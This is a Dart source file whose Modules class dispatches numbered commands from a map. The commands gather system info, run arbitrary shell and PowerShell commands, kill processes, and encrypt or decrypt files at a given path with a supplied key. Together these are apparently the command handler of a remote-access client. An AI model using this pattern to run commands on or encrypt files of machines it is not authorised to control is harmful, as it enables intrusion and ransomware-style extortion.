import 'package:client/modules/system.dart';
import 'package:client/modules/crypto.dart';
import 'package:client/util/manipulate_data.dart';

class Modules {
  System _system;

  Modules() {
    _system = System();
  }

  Future<String> selectorFromMap(Map map) async {
    if (map != null &&
        map.containsKey("id") &&
        map.containsKey("id") != "" &&
        ManipulateData.isInt(map["id"])) {
      int id = int.parse(map["id"]);
      switch (id) {
        case 1:
          return getInfo().toString();
        case 2:
          String parameter = map["parameter"].toString();

          Map retn = await executableCommand(parameter);
          return retn.toString();
        case 3:
          String parameter = map["parameter"].toString();

          Map retn = await executableCommandInPowerShell(parameter);
          return retn.toString();
        case 4:
          String parameter = map["parameter"].toString();

          if (ManipulateData.isInt(parameter)) {
            Map retn = await killProcess(int.parse(parameter));
            return retn.toString();
          }
          return "parameter not is a integer number";
        case 5:
          String path = map['path'];
          String key = map['key'];
          if (key.length != 32) {
            return "key must be 32 characters";
          }
          Map retn = await encryptPath(path, key);
          return retn.toString();
        case 6:
          String path = map['path'];
          String key = map['key'];
          if (key.length != 32) {
            return "key must be 32 characters";
          }
          Map retn = await decryptPath(path, key);
          return retn.toString();
      }
    }
  }

  Map getInfo() {
    return _system.getInfoFromSystem();
  }

  Future<Map> executableCommand(String command) {
    return _system.executableCommand(command);
  }

  Future<Map> executableCommandInPowerShell(String command) {
    return _system.executableCommandInPowerShell(command);
  }

  Future<Map> killProcess(int pId) {
    return _system.killProcess(pId);
  }

  Future<Map> encryptPath(String path, String key) {
    Crypto crypto = Crypto(path, key);
    return crypto.encryptFile();
  }

  Future<Map> decryptPath(String path, String key) {
    Crypto crypto = Crypto(path, key);
    return crypto.decryptFile();
  }
}
